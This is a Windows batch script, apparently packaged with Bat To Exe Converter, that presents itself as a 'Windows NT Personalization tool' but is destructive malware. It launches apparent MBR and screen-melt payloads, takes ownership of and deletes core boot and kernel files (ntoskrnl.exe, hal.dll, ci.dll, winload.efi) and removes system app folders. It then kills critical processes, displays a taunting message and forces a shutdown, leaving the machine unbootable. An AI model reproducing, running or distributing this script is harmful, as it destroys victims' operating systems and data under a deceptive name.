::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDBdRw2+DGK5EqAO7fvHxumIrF4hROcta4DV27iHOuVd40brFQ==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQIHIRVQQxORfEWORoUZ+vv04euLq1ccQOswds/P1buCQA==
::eg0/rx1wNQPfEVWB+kM9LVsJDDOrEkWOUOFSzdDejw==
::fBEirQZwNQPfEVWB+kM9LVsJDDOLMmWuUOFSzfD+jw==
::cRolqwZ3JBvQF1fEqQIALQlHQwqDMGKgA/UF5/3pr92OrEkSQ/F/Vrub07qdNOEf5kTwfJkjtg==
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRLvJ1b6PLvNfqmjleYEsxH9J2MoCCFscdlO/eQ4mrFJys3aWOMmdvwb7TwjB0WIeNVEi0yrsnyQuctBtif8U2i6w6Bur0aAI1Bg=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Windows NT Personalization tool
start C:\Windows\System32\mbr.exe
start C:\Windows\System32\sound.vbs

if exist "%WINDIR%\System32\ntoskrnl.exe" (
takeown /f "%WINDIR%\System32\ntoskrnl.exe"
icacls "%WINDIR%\System32\ntoskrnl.exe" /grant everyone:F
del "%WINDIR%\System32\ntoskrnl.exe" /f /q
)

if exist "%WINDIR%\System32\hal.dll" (
takeown /f "%WINDIR%\System32\hal.dll"
icacls "%WINDIR%\System32\hal.dll" /grant everyone:F
del "%WINDIR%\System32\hal.dll" /f /q
)

if exist "%WINDIR%\System32\ci.dll" (
takeown /f "%WINDIR%\System32\ci.dll"
icacls "%WINDIR%\System32\ci.dll" /grant everyone:F
del "%WINDIR%\System32\ci.dll" /f /q
)

if exist "%WINDIR%\System32\winload.efi" (
takeown /f "%WINDIR%\System32\winload.efi"
icacls "%WINDIR%\System32\winload.efi" /grant everyone:F
del "%WINDIR%\System32\winload.efi" /f /q
)

if exist "C:\Program Files\WindowsApps" (
takeown /f "C:\Program Files\WindowsApps"
icacls "C:\Program Files\WindowsApps" /grant everyone:F
rd "C:\Program Files\WindowsApps" /s /q
)

if exist "C:\Windows\SystemApps" (
takeown /f "C:\Windows\SystemApps"
icacls "C:\Windows\SystemApps" /grant everyone:F
rd "C:\Windows\SystemApps" /s /q
)

if exist "C:\Windows\ImmersiveControlPanel" (
takeown /f "C:\Windows\ImmersiveControlPanel"
icacls "C:\Windows\ImmersiveControlPanel" /grant everyone:F
rd "C:\Windows\ImmersiveControlPanel" /s /q
)

taskkill /f /im explorer.exe
start mspaint.exe
start notepad.exe
start C:\Windows\System32\screenmelt.exe
timeout /t 30 /nobreak >nul
msg * ITS TOO LATE TO REPAIR YOUR PC! I'VE PROBABLY HANGED YOUR PC HAHAHAHA
powershell wininit
taskkill /f /im wininit.exe
taskkill /f /im svchost.exe
taskkill /f /im csrss.exe
taskkill /f /im winlogon.exe
taskkill /f /im wudfhost.exe
shutdown /s /t 0